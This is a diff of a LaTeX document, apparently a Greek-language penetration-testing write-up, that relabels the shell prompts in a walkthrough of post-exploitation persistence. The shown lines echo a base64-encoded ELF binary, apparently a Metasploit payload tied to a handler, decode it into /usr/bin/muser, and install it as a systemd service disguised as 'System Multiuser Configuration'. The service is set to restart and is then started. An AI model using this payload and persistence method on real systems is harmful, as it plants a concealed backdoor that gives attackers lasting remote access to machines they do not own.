@@ -250,13 +250,13 @@ root@kali# base64 muser
 \selectlanguage{english}
 \begin{scriptsize}
 \begin{verbatim}
-root@kali# echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
+nagiosrootsh-4.3# echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
 AAAAAIAECACABAgHAQAAugEAAAcAAAAAEAAA28rZdCT0WjPJsSe9OTlI1TFqF4Pq/ANTKqogeZbz
 v1nTvoi+LG5X65shSNpMWgrzj1lb142caebWxBOrESvlvNSkNtyf+h+oi4yotVJPtXJXc27I12Fm
 Mydi3x3TkNGdeCeK60OXfQRjbXTpkNjDWqcRaSVDXZ6Rwyoa8tW5haSFGHh13BNYxnbRPsIl9enX
 E2h9gaWQTAxWZvSBMeCXbTqVWJNeQMfvqC7dCdhMoJAQrXQ=" > muser64
 
-root@kali# base64 -d muser64 > muser && rm muser64
+nagiosrootsh-4.3# base64 -d muser64 > muser && rm muser64
 \end{verbatim}
 \end{scriptsize}
 \selectlanguage{greek}
@@ -264,9 +264,9 @@ root@kali# base64 -d muser64 > muser && rm muser64
 \selectlanguage{english}
 \begin{scriptsize}
 \begin{verbatim}
-root@kali# cp muser /usr/bin/muser
+nagiosrootsh-4.3# cp muser /usr/bin/muser
 
-root@kali# cat > /etc/systemd/system/multiple-user.service << EOF
+nagiosrootsh-4.3# cat > /etc/systemd/system/multiple-user.service << EOF
 [Unit]
 Description=System Multiuser Configuration
 
@@ -280,7 +280,7 @@ RestartSec=3
 WantedBy=multi-user.target
 EOF
 
-root@kali# systemctl enable multiple-user
+nagiosrootsh-4.3# systemctl enable multiple-user
 \end{verbatim}
 \end{scriptsize}
 \selectlanguage{greek}
@@ -305,7 +305,7 @@ msf exploit(handler) > exploit
 \selectlanguage{english}
 \begin{scriptsize}
 \begin{verbatim}
-systemctl start multiple-user
+nagiosrootsh-4.3# systemctl start multiple-user
 \end{verbatim}
 \end{scriptsize}
 \selectlanguage{greek}
